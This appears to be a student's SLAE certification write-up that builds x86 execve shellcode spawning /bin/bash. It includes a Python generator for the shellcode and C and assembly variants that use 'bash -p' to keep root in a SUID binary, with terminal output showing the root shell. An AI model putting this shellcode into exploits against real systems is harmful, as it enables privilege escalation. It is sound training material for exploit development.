# Note

This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 1483.

# Exo 0 - Execve shellcode - Part 1 - Simple execve

Following the megaprimer, this is a very simple execve program calling */bin/bash*. This small Python 3 program is used in order to have a */bin/bash* string that can be easily pushed on the stack:

```Python
#!python3

import sys

if len(sys.argv) != 2:
   print("Usage: " + sys.argv[0] + " PATH")
   sys.exit(1)

path = sys.argv[1]
result = []


if (len(path) % 4) != 0:
   for i in range(0, 4 - len(path) % 4):
      path = "/" + path

for i in range(0, int(len(path) / 4)):
   tmp = ""
   for letter in path[i*4:(i+1)*4][4::-1]:
      tmp += str(hex(ord(letter))).replace('0x', '')
   result.append(tmp)

for doubleword in result[len(result)::-1]:
   print('0x' + doubleword)
```

```
$ python3 ../reverse-string-x32.py /bin/bash
0x68736162
0x2f6e6962
0x2f2f2f2f
```

The final shellcode is:

```ASM
global _start

section .text

_start:
    xor eax, eax
    
    push eax
    push 0x68736162 ; hsab
    push 0x2f6e6962 ; /nib
    push 0x2f2f2f2f ; ////
    mov ebx, esp

    mov edx, eax
    mov ecx, eax
    
    mov al, 0xb
    int 0x80
```

# Exo 0 - Execve shellcode - Part 1 - Execve generator

A very simple Python 3 program can be done for generating a execve shellcode with a specific program:

```Python
#!python3

import sys

if len(sys.argv) != 2:
   print("Usage: " + sys.argv[0] + " PATH")
   sys.exit(1)

path = sys.argv[1]

shellcode = "global _start \n \
\n \
section .text \n \
\n \
_start:  \n \
    xor eax, eax  \n \
\n \
    push eax  \n \
    *PATH*   \n \
    mov ebx, esp  \n \
\n \
    mov edx, eax  \n \
    mov ecx, eax  \n \
\n \
    mov al, 0xb  \n \
    int 0x80  \n \
"

pushed_value = ""
result = []
if (len(path) % 4) != 0:
   for i in range(0, 4 - len(path) % 4):
      path = "/" + path

for i in range(0, int(len(path) / 4)):
   tmp = ""
   for letter in path[i*4:(i+1)*4][4::-1]:
      tmp += str(hex(ord(letter))).replace('0x', '')
   result.append(tmp)

for doubleword in result[len(result)::-1]:
   pushed_value += ('	push 0x' + doubleword + "\n")

shellcode = shellcode.replace("*PATH*", pushed_value)

print(shellcode)
```

# Exo 0 - Execve shellcode - Part 1 - Execve with arguments

## C program

It may be useful to pass argument to a program. For example, /bin/bash, does not run as root if the program is SUID root. It is possible to run /bin/sh which is in most cases /bin/dash. But on some distribution /bin/sh is just a link to /bin/bash.

Let's check this with a very small C program:

```C
int main()
{
	execve("/bin/bash", 0, 0);
}
```

```
cervoise@slae:~/exam/exo0$ gcc execve-noarg.c -o execve-noarg
cervoise@slae:~/exam/exo0$ sudo chown root:root execve-noarg && sudo chmod u+s execve-noarg 
cervoise@slae:~/exam/exo0$ ls -l execve-noarg
-rwsrwxr-x 1 root root 7168 févr. 25 14:18 execve-noarg
cervoise@slae:~/exam/exo0$ ./execve-noarg 
bash-4.2$ whoami
cervoise
bash-4.2$ id  
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```
In order to get the root privilege, *bash -p* must be called. Let's check with another C program:


```C
main()
{
  char *foo[] = { "/bin/bash", "-p", 0 };
  execve("/bin/bash", foo, 0);
}
```

```
cervoise@slae:~/exam/exo0$ gcc execve-arg.c -o execve-arg
cervoise@slae:~/exam/exo0$ sudo chown root:root execve-arg && sudo chmod u+s execve-arg
cervoise@slae:~/exam/exo0$ ls -l execve-arg
-rwsrwxr-x 1 root root 7166 févr. 25 14:19 execve-arg
cervoise@slae:~/exam/exo0$ ./execve-arg 
bash-4.2# whoami
root
bash-4.2# id
uid=1000(cervoise) gid=1000(cervoise) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),1000(cervoise)
```

## Assembly program

The only difference here is to create a structure that contains:
 * /bin/bash\0
 * -p\0
 * 0

The shellcode is:

```ASM
global _start

section .text

_start:
    
    ; Set EAX and EDX to 0
    xor eax, eax
    cdq 

    ; Push 0
    push eax

    ; Push "////bin/bash"
    push 0x68736162
    push 0x2f6e6962
    push 0x2f2f2f2f
    mov ebx, esp ; "////bin/bash\0" ->  EBX

    ; Push -p\0 and save it into edi
    push eax
    mov dx, 0x702d ;-p
    push dx
    cdq ; restore edx to 0       
    mov edi, esp ; "-p\0" -> EDI
 
    ;push 0, -p\0, ////bin/bash\0 and load it into ECX
    ;   char *foo[] = { "/bin/bash", "-p", 0 };
    ;   execve("/bin/bash", foo, 0);
    push eax
    push edi
    push ebx
    mov ecx, esp

    mov al, 0xb
    int 0x80
```
